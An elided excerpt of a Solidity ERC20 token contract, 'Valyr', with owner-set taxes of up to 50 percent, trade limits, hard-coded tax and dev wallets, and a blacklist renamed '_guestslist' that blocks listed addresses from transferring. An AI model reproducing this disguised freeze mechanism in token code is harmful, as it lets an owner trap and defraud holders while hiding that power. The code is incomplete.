...
contract Valyr is Ownable, ERC20 {
    ...
    uint256 public constant MAX_TOTAL_FEE = 50;
    ...
    mapping(address => bool) public _guestslist;
    ...
    event GuestStatusUpdated(address account, bool isBlacklisted);
    ...
    constructor() Ownable(msg.sender) ERC20("Valyr", "VALYR") {
        address owner = msg.sender;
        _mint(owner, 1_000_000_000 ether);
        uint256 totalSupplyTokens = totalSupply();

        taxWallet = 0x4BBd668E48f3509A03150Fb0ceF769EF3e39aacA;
        devWallet = 0x325e9d45D01023cf87B67A4da4C45c69759d74a1;
    ...
    function _setMaxBuySize(uint256 amount) external onlyOwner {
        require(amount >= ((totalSupply() * 2) / 1000), AmountTooSmall());
        maxBuyLimit = amount;
        emit MaxBuyLimitUpdated(maxBuyLimit);
    }

    function _setMaxSellSize(uint256 amount) external onlyOwner {
        require(amount >= ((totalSupply() * 2) / 1000), AmountTooSmall());
        maxSellLimit = amount;
        emit MaxSellLimitUpdated(maxSellLimit);
    }

    function _setMaxWalletSize(uint256 amount) external onlyOwner {
        require(amount >= ((totalSupply() * 2) / 1000), AmountTooSmall());
        maxWalletLimit = amount;
        emit MaxWalletLimitUpdated(maxWalletLimit);
    }

    function _setExactTokensForSwap(uint256 amount) external onlyOwner {
        uint256 totalSupplyTokens = totalSupply();
        require(amount >= (totalSupplyTokens * 1) / 100000, AmountTooSmall());
    ...
    function _setFees(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
    ...
    function _changeTransferTax(uint256 _transferTax) external onlyOwner {
    ...
    function setlistedGuests(
        ...
        for (uint256 i = 0; i < accounts.length; i++) {
            ...
            ) _updateGuestStatus(accounts[i], value);
        }
    }
    ...
    function _update(
        ...
        require(!_guestslist[from], GuestActivityDetected());
        require(
            sender == from || !_guestslist[sender],
            GuestActivityDetected()
        );
        require(
            origin == from || origin == sender || !_guestslist[origin],
            GuestActivityDetected()
        );
    ...
    function _swapTokens(uint256 tokenAmount) internal virtual lockSwapProcess {
        ...
        uint256 maxSwapAmount = tokensForSwap * 2;
    ...
    function _updateGuestStatus(address account, bool value) internal virtual {
        _guestslist[account] = value;
        emit GuestStatusUpdated(account, value);
    }
